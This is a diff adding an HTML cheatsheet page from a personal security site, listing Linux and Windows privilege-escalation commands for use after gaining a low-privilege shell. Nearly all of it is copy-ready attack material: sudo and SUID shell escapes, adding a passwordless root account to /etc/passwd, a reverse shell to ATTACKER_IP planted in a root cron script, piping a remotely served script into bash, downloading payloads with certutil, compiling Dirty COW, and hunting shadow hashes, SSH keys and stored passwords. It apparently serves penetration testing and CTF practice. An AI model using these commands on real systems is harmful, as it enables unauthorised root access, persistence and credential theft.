@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Privilege Escalation | Renvector Cheatsheets</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f; --bg2: #111118; --bg3: #1a1a24;
+    --border: #2a2a3a; --accent: #3b82f6; --accent2: #60a5fa;
+    --green: #22d3a5; --yellow: #f59e0b; --red: #ef4444; --purple: #a78bfa;
+    --text: #e2e8f0; --text2: #94a3b8; --text3: #64748b;
+    --mono: 'JetBrains Mono', monospace; --sans: 'Inter', sans-serif;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; line-height: 1.6; }
+  nav { position: sticky; top: 0; z-index: 100; background: rgba(10,10,15,0.9); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 0 2rem; display: flex; align-items: center; justify-content: space-between; height: 56px; }
+  .nav-logo { font-family: var(--mono); font-size: 1rem; color: var(--text); text-decoration: none; }
+  .nav-logo span { color: var(--accent); }
+  .nav-links { display: flex; gap: 2rem; }
+  .nav-links a { color: var(--text2); text-decoration: none; font-size: .875rem; transition: color .2s; }
+  .nav-links a:hover { color: var(--text); }
+  .page-header { border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; max-width: 1100px; margin: 0 auto; }
+  .breadcrumb { font-family: var(--mono); font-size: .75rem; color: var(--text3); margin-bottom: 1rem; }
+  .breadcrumb span { color: var(--accent); }
+  .page-header h1 { font-size: 2rem; font-weight: 600; margin-bottom: .75rem; display: flex; align-items: center; gap: .75rem; }
+  .page-icon { width: 40px; height: 40px; border-radius: 8px; background: rgba(59,130,246,.15); border: 1px solid rgba(59,130,246,.3); display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
+  .page-header p { color: var(--text2); font-size: .95rem; max-width: 640px; }
+  .tag-row { display: flex; flex-wrap: wrap; gap: .5rem; margin-top: 1rem; }
+  .tag { font-family: var(--mono); font-size: .7rem; background: var(--bg3); border: 1px solid var(--border); padding: .25rem .6rem; border-radius: 4px; color: var(--text2); }
+  .layout { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: 220px 1fr; gap: 0; }
+  .sidebar { border-right: 1px solid var(--border); padding: 2rem 1.5rem; position: sticky; top: 56px; height: calc(100vh - 56px); overflow-y: auto; }
+  .sidebar-label { font-family: var(--mono); font-size: .65rem; color: var(--text3); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 1rem; }
+  .sidebar nav { display: flex; flex-direction: column; gap: .25rem; }
+  .sidebar nav a { font-size: .8rem; color: var(--text2); text-decoration: none; padding: .4rem .75rem; border-radius: 5px; border-left: 2px solid transparent; transition: all .15s; }
+  .sidebar nav a:hover { color: var(--text); background: var(--bg3); border-left-color: var(--border); }
+  .sidebar nav a.active { color: var(--accent2); background: rgba(59,130,246,.08); border-left-color: var(--accent); }
+  .content { padding: 2rem 2.5rem; }
+  .section { margin-bottom: 3rem; }
+  .section-title { font-size: 1.1rem; font-weight: 600; display: flex; align-items: center; gap: .6rem; margin-bottom: 1.5rem; padding-bottom: .75rem; border-bottom: 1px solid var(--border); }
+  .section-title .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
+  .section-num { font-family: var(--mono); font-size: .7rem; color: var(--accent); background: rgba(59,130,246,.1); padding: .2rem .5rem; border-radius: 4px; }
+  .cmd-group { margin-bottom: 1.75rem; }
+  .cmd-group-title { font-family: var(--mono); font-size: .75rem; color: var(--green); margin-bottom: .6rem; letter-spacing: .05em; }
+  .cmd-block { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+  .cmd-block-header { display: flex; align-items: center; justify-content: space-between; padding: .5rem .9rem; background: var(--bg3); border-bottom: 1px solid var(--border); }
+  .cmd-block-label { font-family: var(--mono); font-size: .7rem; color: var(--text3); }
+  .copy-btn { font-family: var(--mono); font-size: .65rem; color: var(--text3); background: none; border: 1px solid var(--border); padding: .15rem .5rem; border-radius: 3px; cursor: pointer; transition: all .15s; }
+  .copy-btn:hover { color: var(--accent2); border-color: var(--accent); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green); }
+  pre { padding: .9rem 1rem; font-family: var(--mono); font-size: .78rem; color: var(--text); line-height: 1.7; overflow-x: auto; white-space: pre; }
+  .c-comment { color: var(--text3); }
+  .c-cmd { color: var(--accent2); }
+  .c-flag { color: var(--yellow); }
+  .c-val { color: var(--green); }
+  .c-warn { color: var(--red); }
+  .c-purple { color: var(--purple); }
+  .note { background: rgba(59,130,246,.06); border: 1px solid rgba(59,130,246,.2); border-left: 3px solid var(--accent); border-radius: 0 6px 6px 0; padding: .75rem 1rem; font-size: .8rem; color: var(--text2); margin-bottom: 1.25rem; }
+  .note strong { color: var(--accent2); }
+  .warn-note { background: rgba(245,158,11,.06); border: 1px solid rgba(245,158,11,.2); border-left: 3px solid var(--yellow); border-radius: 0 6px 6px 0; padding: .75rem 1rem; font-size: .8rem; color: var(--text2); margin-bottom: 1.25rem; }
+  .warn-note strong { color: var(--yellow); }
+  .ref-table { width: 100%; border-collapse: collapse; margin-bottom: 1.5rem; }
+  .ref-table th { text-align: left; font-family: var(--mono); font-size: .7rem; color: var(--text3); padding: .5rem .75rem; border-bottom: 1px solid var(--border); letter-spacing: .08em; }
+  .ref-table td { padding: .55rem .75rem; font-size: .82rem; border-bottom: 1px solid rgba(42,42,58,.5); vertical-align: top; }
+  .ref-table td:first-child { font-family: var(--mono); color: var(--accent2); font-size: .75rem; }
+  .ref-table td:last-child { color: var(--text2); }
+  .ref-table tr:last-child td { border-bottom: none; }
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="nav-logo">&lt;<span>Renvector</span>/&gt;</a>
+  <div class="nav-links">
+    <a href="../index.html#about">About</a>
+    <a href="../index.html#cheatsheets">Cheatsheets</a>
+    <a href="../index.html#skills">Skills</a>
+    <a href="../index.html#contact">Contact</a>
+  </div>
+</nav>
+
+<div class="page-header">
+  <div class="breadcrumb">cheatsheets / <span>privilege-escalation</span></div>
+  <h1><div class="page-icon">🔺</div>Privilege Escalation</h1>
+  <p>Linux and Windows privesc vectors, enumeration scripts, and common misconfiguration exploits.</p>
+  <div class="tag-row">
+    <span class="tag">LinPEAS</span><span class="tag">WinPEAS</span><span class="tag">GTFOBins</span>
+    <span class="tag">sudo</span><span class="tag">SUID</span><span class="tag">Cron</span>
+  </div>
+</div>
+
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sidebar-label">Sections</div>
+    <nav>
+      <a href="#enum-linux" class="active">01. Linux Enumeration</a>
+      <a href="#sudo">02. Sudo Exploits</a>
+      <a href="#suid">03. SUID Binaries</a>
+      <a href="#cron">04. Cron Jobs</a>
+      <a href="#passwd">05. Writable Files</a>
+      <a href="#kernel">06. Kernel Exploits</a>
+      <a href="#scripts">07. Enum Scripts</a>
+      <a href="#windows">08. Windows Privesc</a>
+      <a href="#gtfobins">09. GTFOBins Ref</a>
+    </nav>
+  </aside>
+
+  <main class="content">
+
+    <!-- 01 LINUX ENUM -->
+    <section class="section" id="enum-linux">
+      <div class="section-title"><div class="dot"></div><span class="section-num">01</span>Linux — Initial Enumeration</div>
+
+      <div class="note"><strong>Mindset:</strong> You have a low-priv shell. Goal is root. Enumerate everything — misconfigs, weak permissions, outdated kernel, credentials in files.</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># System & User Info</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">id</span>                              <span class="c-comment"># current user and groups</span>
+<span class="c-cmd">whoami</span>
+<span class="c-cmd">uname -a</span>                        <span class="c-comment"># kernel version</span>
+<span class="c-cmd">cat /etc/os-release</span>             <span class="c-comment"># distro info</span>
+<span class="c-cmd">cat /etc/passwd</span>                 <span class="c-comment"># list all users</span>
+<span class="c-cmd">cat /etc/shadow</span>                 <span class="c-comment"># password hashes (if readable)</span>
+<span class="c-cmd">cat /etc/group</span>                  <span class="c-comment"># group memberships</span>
+<span class="c-cmd">env</span>                             <span class="c-comment"># environment variables</span>
+<span class="c-cmd">history</span>                         <span class="c-comment"># command history</span>
+<span class="c-cmd">cat ~/.bash_history</span>
+<span class="c-cmd">cat /etc/hosts</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Network & Processes</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">ss -tnp</span>                         <span class="c-comment"># open TCP ports</span>
+<span class="c-cmd">netstat -antup</span>                  <span class="c-comment"># all connections</span>
+<span class="c-cmd">ps aux</span>                          <span class="c-comment"># all running processes</span>
+<span class="c-cmd">ps aux | grep root</span>              <span class="c-comment"># processes running as root</span>
+<span class="c-cmd">ip a</span>                            <span class="c-comment"># network interfaces</span>
+<span class="c-cmd">route</span>                           <span class="c-comment"># routing table</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Credential Hunting</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Config files with passwords</span>
+<span class="c-cmd">find / -name</span> <span class="c-val">"*.conf"</span> <span class="c-val">2>/dev/null</span> | <span class="c-cmd">xargs grep -l</span> <span class="c-val">"password"</span> <span class="c-val">2>/dev/null</span>
+<span class="c-cmd">find / -name</span> <span class="c-val">"config.php"</span> <span class="c-val">2>/dev/null</span>
+<span class="c-cmd">grep -r</span> <span class="c-val">"password"</span> <span class="c-val">/var/www/html</span> <span class="c-val">2>/dev/null</span>
+
+<span class="c-comment"># SSH keys</span>
+<span class="c-cmd">find / -name</span> <span class="c-val">"id_rsa"</span> <span class="c-val">2>/dev/null</span>
+<span class="c-cmd">find / -name</span> <span class="c-val">"authorized_keys"</span> <span class="c-val">2>/dev/null</span>
+
+<span class="c-comment"># World-readable sensitive files</span>
+<span class="c-cmd">find /home -readable -type f</span> <span class="c-val">2>/dev/null</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 02 SUDO -->
+    <section class="section" id="sudo">
+      <div class="section-title"><div class="dot"></div><span class="section-num">02</span>Sudo Exploits</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Check Sudo Permissions</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">sudo -l</span>       <span class="c-comment"># list allowed sudo commands</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Common Sudo GTFOBins Escapes</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># vim</span>
+<span class="c-cmd">sudo vim</span> <span class="c-flag">-c</span> <span class="c-val">':!/bin/bash'</span>
+
+<span class="c-comment"># nano (from nano)</span>
+<span class="c-val">^R^X</span>  then type: <span class="c-val">reset; sh 1>&0 2>&0</span>
+
+<span class="c-comment"># less / man</span>
+<span class="c-cmd">sudo less /etc/passwd</span>    <span class="c-comment"># then type: !/bin/bash</span>
+<span class="c-cmd">sudo man man</span>              <span class="c-comment"># then type: !/bin/bash</span>
+
+<span class="c-comment"># python</span>
+<span class="c-cmd">sudo python3 -c</span> <span class="c-val">'import os;os.system("/bin/bash")'</span>
+
+<span class="c-comment"># perl</span>
+<span class="c-cmd">sudo perl -e</span> <span class="c-val">'exec "/bin/bash"'</span>
+
+<span class="c-comment"># ruby</span>
+<span class="c-cmd">sudo ruby -e</span> <span class="c-val">'exec "/bin/bash"'</span>
+
+<span class="c-comment"># find</span>
+<span class="c-cmd">sudo find . -exec</span> <span class="c-val">/bin/bash</span> <span class="c-flag">\;</span>
+
+<span class="c-comment"># awk</span>
+<span class="c-cmd">sudo awk</span> <span class="c-val">'BEGIN {system("/bin/bash")}'</span>
+
+<span class="c-comment"># nmap (older versions with --interactive)</span>
+<span class="c-cmd">sudo nmap --interactive</span>
+<span class="c-val">nmap> !sh</span>
+
+<span class="c-comment"># tar</span>
+<span class="c-cmd">sudo tar</span> <span class="c-flag">-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 03 SUID -->
+    <section class="section" id="suid">
+      <div class="section-title"><div class="dot"></div><span class="section-num">03</span>SUID Binary Exploits</div>
+
+      <div class="warn-note"><strong>What is SUID?</strong> Binaries with SUID bit set run as the file owner (often root) regardless of who executes them. Find them → check GTFOBins.</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Find SUID Binaries</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># All SUID binaries</span>
+<span class="c-cmd">find / -perm</span> <span class="c-flag">-4000</span> <span class="c-val">2>/dev/null</span>
+
+<span class="c-comment"># SUID + SGID</span>
+<span class="c-cmd">find / -perm</span> <span class="c-flag">-u=s</span> <span class="c-flag">-o</span> <span class="c-flag">-perm -g=s</span> <span class="c-val">2>/dev/null</span>
+
+<span class="c-comment"># With full path and permissions</span>
+<span class="c-cmd">find / -perm</span> <span class="c-flag">-4000</span> <span class="c-flag">-type f</span> <span class="c-flag">-exec ls -la {} \;</span> <span class="c-val">2>/dev/null</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Common SUID Exploits</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># bash (if SUID)</span>
+<span class="c-cmd">/bin/bash -p</span>                     <span class="c-comment"># -p preserves EUID</span>
+
+<span class="c-comment"># find</span>
+<span class="c-cmd">find . -exec</span> <span class="c-val">/bin/bash -p</span> <span class="c-flag">\;</span>
+
+<span class="c-comment"># cp — overwrite /etc/passwd or /etc/shadow</span>
+<span class="c-cmd">cp /etc/passwd /tmp/passwd.bak</span>
+<span class="c-comment"># Add root user with no password to /etc/passwd</span>
+<span class="c-val">newroot::0:0:root:/root:/bin/bash</span>  <span class="c-comment"># append this line</span>
+<span class="c-cmd">cp /tmp/passwd.new /etc/passwd</span>
+
+<span class="c-comment"># nmap (SUID)</span>
+<span class="c-cmd">nmap --interactive</span>
+<span class="c-val">nmap> !sh</span>
+
+<span class="c-comment"># python / python3</span>
+<span class="c-cmd">./python3 -c</span> <span class="c-val">'import os;os.execl("/bin/sh","sh","-p")'</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 04 CRON -->
+    <section class="section" id="cron">
+      <div class="section-title"><div class="dot"></div><span class="section-num">04</span>Cron Job Exploitation</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Find Cron Jobs</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">cat /etc/crontab</span>
+<span class="c-cmd">cat /etc/cron.d/*</span>
+<span class="c-cmd">ls -la /etc/cron.*</span>
+<span class="c-cmd">crontab -l</span>                      <span class="c-comment"># current user crons</span>
+<span class="c-cmd">crontab -l -u root</span>               <span class="c-comment"># root crons (if allowed)</span>
+
+<span class="c-comment"># Monitor running crons</span>
+<span class="c-cmd">watch -n 1</span> <span class="c-val">"ps aux | grep cron"</span>
+
+<span class="c-comment"># pspy — monitor without root</span>
+<span class="c-val">./pspy64</span>                         <span class="c-comment"># download from github</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Exploitation — Writable Cron Script</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># If cron runs /opt/cleanup.sh as root and we can write to it</span>
+<span class="c-cmd">echo</span> <span class="c-val">'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'</span> >> <span class="c-val">/opt/cleanup.sh</span>
+
+<span class="c-comment"># Or: chmod SUID on bash</span>
+<span class="c-cmd">echo</span> <span class="c-val">'chmod +s /bin/bash'</span> >> <span class="c-val">/opt/cleanup.sh</span>
+<span class="c-comment"># After cron runs:</span>
+<span class="c-cmd">/bin/bash -p</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 05 WRITABLE FILES -->
+    <section class="section" id="passwd">
+      <div class="section-title"><div class="dot"></div><span class="section-num">05</span>Writable Files &amp; /etc/passwd</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Find World-Writable Files</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># World-writable files</span>
+<span class="c-cmd">find / -writable -type f</span> <span class="c-val">2>/dev/null</span>
+
+<span class="c-comment"># World-writable directories</span>
+<span class="c-cmd">find / -writable -type d</span> <span class="c-val">2>/dev/null</span>
+
+<span class="c-comment"># Check if /etc/passwd is writable</span>
+<span class="c-cmd">ls -la /etc/passwd</span>
+<span class="c-cmd">ls -la /etc/shadow</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># /etc/passwd — Add Root User</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Generate password hash</span>
+<span class="c-cmd">openssl passwd</span> <span class="c-flag">-1</span> <span class="c-val">-salt xyz</span> <span class="c-val">password123</span>
+
+<span class="c-comment"># Append new root user to /etc/passwd (no hash = no password)</span>
+<span class="c-cmd">echo</span> <span class="c-val">'renvector::0:0:root:/root:/bin/bash'</span> >> <span class="c-val">/etc/passwd</span>
+
+<span class="c-comment"># Append with password hash</span>
+<span class="c-cmd">echo</span> <span class="c-val">'renvector:$1$xyz$HASH:0:0:root:/root:/bin/bash'</span> >> <span class="c-val">/etc/passwd</span>
+
+<span class="c-comment"># Switch to new root user</span>
+<span class="c-cmd">su renvector</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 06 KERNEL -->
+    <section class="section" id="kernel">
+      <div class="section-title"><div class="dot"></div><span class="section-num">06</span>Kernel Exploits</div>
+
+      <div class="warn-note"><strong>Warning:</strong> Kernel exploits can crash the system. Use as last resort in real engagements. In CTFs/labs, go for it.</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Check Kernel Version & Search Exploits</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">uname -a</span>
+<span class="c-comment"># Example output: Linux victim 3.13.0-24-generic #46-Ubuntu...</span>
+
+<span class="c-comment"># Search exploitdb</span>
+<span class="c-cmd">searchsploit</span> <span class="c-val">linux kernel 3.13</span>
+<span class="c-cmd">searchsploit</span> <span class="c-val">Ubuntu 14.04</span>
+
+<span class="c-comment"># Copy exploit to working dir</span>
+<span class="c-cmd">searchsploit -m</span> <span class="c-val">37292</span>             <span class="c-comment"># overlayfs privesc</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Dirty COW (CVE-2016-5195) — Kernel &lt; 4.8.3</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Download exploit</span>
+<span class="c-cmd">searchsploit -m</span> <span class="c-val">40839</span>
+
+<span class="c-comment"># Compile and run</span>
+<span class="c-cmd">gcc</span> <span class="c-flag">-pthread</span> <span class="c-val">40839.c</span> <span class="c-flag">-o</span> <span class="c-val">dirtycow</span> <span class="c-flag">-lcrypt</span>
+<span class="c-cmd">./dirtycow</span> <span class="c-val">password123</span>
+
+<span class="c-comment"># Creates firefart user with root privs</span>
+<span class="c-cmd">su firefart</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07 SCRIPTS -->
+    <section class="section" id="scripts">
+      <div class="section-title"><div class="dot"></div><span class="section-num">07</span>Automated Enumeration Scripts</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># LinPEAS (Linux Privilege Escalation Awesome Script)</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Download on attacker, serve to target</span>
+<span class="c-cmd">curl</span> <span class="c-flag">-L</span> <span class="c-val">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span> <span class="c-flag">-o</span> <span class="c-val">linpeas.sh</span>
+<span class="c-cmd">python3 -m http.server</span> <span class="c-val">8000</span>
+
+<span class="c-comment"># On target</span>
+<span class="c-cmd">wget http://ATTACKER_IP:8000/linpeas.sh</span>
+<span class="c-cmd">chmod +x linpeas.sh</span>
+<span class="c-cmd">./linpeas.sh</span> | <span class="c-cmd">tee</span> <span class="c-val">/tmp/linpeas_out.txt</span>
+
+<span class="c-comment"># Run directly without saving</span>
+<span class="c-cmd">curl</span> <span class="c-val">http://ATTACKER_IP:8000/linpeas.sh</span> | <span class="c-cmd">bash</span>
+
+<span class="c-comment"># Color reference:</span>
+<span class="c-warn"># Red/Yellow = HIGH confidence vectors</span>
+<span class="c-comment"># Cyan = interesting config</span>
+<span class="c-comment"># Green = normal/info</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># linux-exploit-suggester</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">bash</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span>
+<span class="c-cmd">chmod +x linux-exploit-suggester.sh</span>
+<span class="c-cmd">./linux-exploit-suggester.sh</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 08 WINDOWS -->
+    <section class="section" id="windows">
+      <div class="section-title"><div class="dot"></div><span class="section-num">08</span>Windows Privilege Escalation</div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Initial Enumeration (cmd / powershell)</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">cmd</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-cmd">whoami</span>
+<span class="c-cmd">whoami /priv</span>                     <span class="c-comment"># current privileges</span>
+<span class="c-cmd">whoami /groups</span>                   <span class="c-comment"># group memberships</span>
+<span class="c-cmd">net user</span>                         <span class="c-comment"># all users</span>
+<span class="c-cmd">net localgroup administrators</span>   <span class="c-comment"># admin group members</span>
+<span class="c-cmd">systeminfo</span>                       <span class="c-comment"># OS/patch level</span>
+<span class="c-cmd">ipconfig /all</span>
+<span class="c-cmd">netstat -ano</span>
+<span class="c-cmd">tasklist</span>                         <span class="c-comment"># running processes</span>
+<span class="c-cmd">schtasks /query /fo LIST /v</span>      <span class="c-comment"># scheduled tasks</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># WinPEAS</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">powershell</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Download and run</span>
+<span class="c-cmd">certutil -urlcache -f</span> <span class="c-val">http://ATTACKER_IP:8000/winPEAS.exe</span> <span class="c-val">winpeas.exe</span>
+<span class="c-cmd">.\winpeas.exe</span>
+
+<span class="c-comment"># Powershell download</span>
+<span class="c-cmd">Invoke-WebRequest</span> <span class="c-flag">-Uri</span> <span class="c-val">http://ATTACKER_IP:8000/winPEAS.exe</span> <span class="c-flag">-OutFile</span> <span class="c-val">C:\Users\Public\winpeas.exe</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Token Impersonation — Juicy Potato / PrintSpoofer</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">cmd</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Check for SeImpersonatePrivilege or SeAssignPrimaryToken</span>
+<span class="c-cmd">whoami /priv</span>
+
+<span class="c-comment"># PrintSpoofer (Windows 10 / Server 2019)</span>
+<span class="c-cmd">.\PrintSpoofer.exe</span> <span class="c-flag">-i -c</span> <span class="c-val">cmd</span>
+
+<span class="c-comment"># JuicyPotatoNG (older systems)</span>
+<span class="c-cmd">.\JuicyPotatoNG.exe</span> <span class="c-flag">-t *</span> <span class="c-flag">-p</span> <span class="c-val">C:\Windows\System32\cmd.exe</span></pre>
+        </div>
+      </div>
+
+      <div class="cmd-group">
+        <div class="cmd-group-title"># Unquoted Service Path</div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="cmd-block-label">cmd</span><button class="copy-btn" onclick="copyBlock(this)">copy</button></div>
+          <pre><span class="c-comment"># Find unquoted service paths</span>
+<span class="c-cmd">wmic service get name,displayname,pathname,startmode</span> | <span class="c-cmd">findstr /i</span> <span class="c-val">"Auto"</span> | <span class="c-cmd">findstr /i /v</span> <span class="c-val">"C:\Windows"</span> | <span class="c-cmd">findstr /i /v</span> <span class="c-val">""""</span>
+
+<span class="c-comment"># If path is: C:\Program Files\Vuln App\service.exe</span>
+<span class="c-comment"># Place malicious exe at: C:\Program.exe or C:\Program Files\Vuln.exe</span>
+<span class="c-cmd">sc stop</span> <span class="c-val">VulnService</span>
+<span class="c-cmd">sc start</span> <span class="c-val">VulnService</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 09 GTFOBINS -->
+    <section class="section" id="gtfobins">
+      <div class="section-title"><div class="dot"></div><span class="section-num">09</span>GTFOBins Quick Reference</div>
+
+      <div class="note"><strong>Resource:</strong> Always cross-check at <strong>gtfobins.github.io</strong> — filter by sudo, suid, or capabilities.</div>
+
+      <table class="ref-table">
+        <thead><tr><th>Binary</th><th>SUID Escape</th><th>Sudo Escape</th></tr></thead>
+        <tbody>
+          <tr><td>bash</td><td><code>bash -p</code></td><td><code>sudo bash</code></td></tr>
+          <tr><td>vim</td><td><code>vim -c ':!/bin/bash'</code></td><td><code>sudo vim -c ':!/bin/bash'</code></td></tr>
+          <tr><td>python3</td><td><code>python3 -c 'import os;os.execl("/bin/sh","sh","-p")'</code></td><td><code>sudo python3 -c 'import os;os.system("/bin/bash")'</code></td></tr>
+          <tr><td>find</td><td><code>find . -exec /bin/bash -p \;</code></td><td><code>sudo find . -exec /bin/bash \;</code></td></tr>
+          <tr><td>awk</td><td>N/A</td><td><code>sudo awk 'BEGIN {system("/bin/bash")}'</code></td></tr>
+          <tr><td>less</td><td>N/A</td><td><code>sudo less /etc/passwd → !/bin/bash</code></td></tr>
+          <tr><td>tar</td><td>N/A</td><td><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></td></tr>
+          <tr><td>perl</td><td>N/A</td><td><code>sudo perl -e 'exec "/bin/bash"'</code></td></tr>
+          <tr><td>nmap</td><td>N/A</td><td><code>sudo nmap --interactive → !sh</code></td></tr>
+          <tr><td>env</td><td>N/A</td><td><code>sudo env /bin/bash</code></td></tr>
+        </tbody>
+      </table>
+    </section>
+
+  </main>
+</div>
+
+<script>
+  function copyBlock(btn) {
+    const pre = btn.closest('.cmd-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1800);
+    });
+  }
+  const sections = document.querySelectorAll('.section');
+  const links = document.querySelectorAll('.sidebar nav a');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const link = document.querySelector(`.sidebar nav a[href="#${e.target.id}"]`);
+        if (link) link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-40% 0px -55% 0px' });
+  sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
